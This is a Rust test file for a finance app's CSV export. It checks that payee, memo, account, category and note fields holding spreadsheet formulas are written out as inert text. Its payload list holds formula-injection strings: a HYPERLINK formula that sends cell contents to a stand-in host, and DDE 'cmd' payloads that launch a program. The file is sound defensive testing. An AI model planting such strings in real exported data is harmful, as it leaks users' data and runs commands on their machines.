// SPDX-FileCopyrightText: 2026 KassenSturz contributors
// SPDX-License-Identifier: GPL-3.0-or-later

//! Attack scenario A7 of the outside security review: data leaves through
//! a file the user shares. A payee, memo, account or category written so a
//! spreadsheet runs it as a formula (here one that would call a web
//! address) must reach the CSV file as text. All data is made up (AGENTS.md
//! §3.1 rule 2).

use kassensturz_core::{CurrencyCode, Date, Money};
use kassensturz_export::{
    AccountTransactions, Counterpart, CsvExport, ExportData, TransactionRow, export,
};

const EUR: CurrencyCode = match CurrencyCode::new("EUR") {
    Ok(code) => code,
    Err(_) => panic!("EUR is a valid code"),
};

/// Texts a spreadsheet would run: the review's link, a DDE call, and the
/// other characters that start a formula.
const HOSTILE: &[&str] = &[
    "=HYPERLINK(\"https://example.invalid/?\"&A2;\"x\")",
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "\t=1+1",
    "\r=1+1",
];

#[test]
fn a7_formulas_in_every_text_field_are_written_as_text() {
    for hostile in HOSTILE {
        let data = ExportData::Transactions(vec![AccountTransactions {
            account: (*hostile).to_owned(),
            currency: EUR,
            minor_digits: 2,
            rows: vec![TransactionRow {
                date: Date::new(2026, 10, 5).expect("a valid date"),
                payee: Some((*hostile).to_owned()),
                counterpart: Counterpart::Category((*hostile).to_owned()),
                memo: Some((*hostile).to_owned()),
                note: Some((*hostile).to_owned()),
                amount: Money::from_minor_units(-1_250, EUR),
                original: None,
            }],
        }]);
        let bytes = export(&CsvExport::default(), &data).expect("exported");
        let text = String::from_utf8(bytes).expect("UTF-8");
        let fields = fields(&text);
        let guarded = format!("'{hostile}");
        // The account, payee, category, memo and note.
        assert_eq!(
            fields.iter().filter(|field| **field == guarded).count(),
            5,
            "{hostile:?} in {fields:?}"
        );
        for field in &fields {
            assert!(
                !field.starts_with(['=', '+', '@', '\t', '\r'])
                    && !(field.starts_with('-')
                        && !field[1..].chars().all(|c| c.is_ascii_digit() || c == '.')),
                "a field a spreadsheet runs: {field:?}"
            );
        }
    }
}

/// The fields of a CSV file of RFC 4180, unquoted.
fn fields(text: &str) -> Vec<String> {
    let mut fields = Vec::new();
    let mut field = String::new();
    let mut quoted = false;
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        match (quoted, c) {
            (true, '"') if chars.peek() == Some(&'"') => {
                field.push('"');
                chars.next();
            }
            (true, '"') => quoted = false,
            (true, c) => field.push(c),
            (false, '"') => quoted = true,
            (false, ',' | '\n') => fields.push(std::mem::take(&mut field)),
            (false, '\r') => {}
            (false, c) => field.push(c),
        }
    }
    fields
}
